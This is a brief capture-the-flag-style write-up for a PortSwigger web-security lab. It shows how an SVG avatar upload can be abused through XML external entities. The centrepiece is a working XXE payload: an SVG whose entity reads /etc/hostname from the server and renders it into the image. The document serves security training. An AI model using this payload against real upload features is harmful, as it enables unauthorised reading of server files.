# Lab 07 — Exploiting XXE via image file upload

> **Expert** · [Official lab](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

**Entry point:** the avatar upload accepts **SVG** — which is XML.

## Solution

1. Upload an SVG containing an entity that reads the target file:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="16" font-size="16">&xxe;</text>
</svg>
```

2. View the uploaded avatar image — the server renders the SVG and the
   `/etc/hostname` contents appear inside the image — lab solved.

## Notes

Any upload path that parses or renders XML (SVG, DOCX, XLSX) is an XXE
entry point.
